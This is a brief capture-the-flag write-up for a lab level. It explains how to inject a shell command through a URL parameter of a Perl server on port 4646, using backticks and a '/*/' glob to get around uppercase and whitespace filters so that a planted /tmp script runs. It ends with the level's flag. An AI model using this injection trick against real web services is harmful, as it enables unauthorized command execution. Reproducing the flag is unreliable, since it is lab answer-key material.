Still a perl server listening on 4646. It takes two URL params, (x,y) two rep-regex are passed on x, first -> lower to upper, second -> strip anything after a space/tab/whatereveer
We can inject some command through X.
First step, create a small executable script /tmp/<script> and then -> x = `/*/<script>`. it match /tmp/<script> and execute the script

script =
#!/bin/bash

getflag > /tmp/<aFile>;

make the request, check for /tmp/<afile> and get ur flag

flag=g1qKMiRpXf53AWhDaU7FEkczr
